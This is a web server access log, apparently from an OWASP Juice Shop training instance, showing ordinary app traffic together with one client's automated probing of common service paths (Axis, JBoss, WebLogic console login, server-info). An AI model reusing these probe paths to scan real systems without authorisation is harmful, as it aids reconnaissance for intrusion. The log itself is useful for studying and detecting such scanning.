49.36.97.128 - - [04/Aug/2025:04:32:05 +0000] "GET /axis2/services/listServices HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:05 +0000] "GET /assets/i18n/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:05 +0000] "GET /dswsbobje/services/listServices HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:05 +0000] "GET /axis1/services/listServices HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:06 +0000] "GET /axis/services/listServices HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
111.223.186.144 - - [04/Aug/2025:04:32:06 +0000] "GET /orders/socket.io/?EIO=4&transport=polling&t=PXpMTZk HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/orders" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:06 +0000] "GET /jboss-net/services/listServices HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:06 +0000] "POST /console/j_security_check HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:06 +0000] "GET /rest/captcha/ HTTP/1.1" 200 48 "https://demo.owasp-juice.shop/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:06 +0000] "GET /rest/captcha/ HTTP/1.1" 200 50 "https://demo.owasp-juice.shop/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:07 +0000] "GET /app/build/routes/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:07 +0000] "GET /app/node_modules/morgan/runtime.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:07 +0000] "GET /coredumpcheck.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
213.24.135.137 - - [04/Aug/2025:04:32:07 +0000] "GET /rest/admin/application-version HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
213.24.135.137 - - [04/Aug/2025:04:32:07 +0000] "GET /rest/admin/application-configuration HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
213.24.135.137 - - [04/Aug/2025:04:32:07 +0000] "GET /rest/languages HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
213.24.135.137 - - [04/Aug/2025:04:32:07 +0000] "GET /api/Quantitys/ HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
213.24.135.137 - - [04/Aug/2025:04:32:07 +0000] "GET /api/Challenges/?name=Score%20Board HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
213.24.135.137 - - [04/Aug/2025:04:32:07 +0000] "GET /rest/products/search?q= HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
213.24.135.137 - - [04/Aug/2025:04:32:07 +0000] "GET /rest/admin/application-version HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
213.24.135.137 - - [04/Aug/2025:04:32:07 +0000] "GET /rest/admin/application-configuration HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
213.24.135.137 - - [04/Aug/2025:04:32:07 +0000] "GET /api/Challenges/?name=Score%20Board HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:07 +0000] "GET /server-info HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
213.24.135.137 - - [04/Aug/2025:04:32:07 +0000] "GET /rest/admin/application-configuration HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
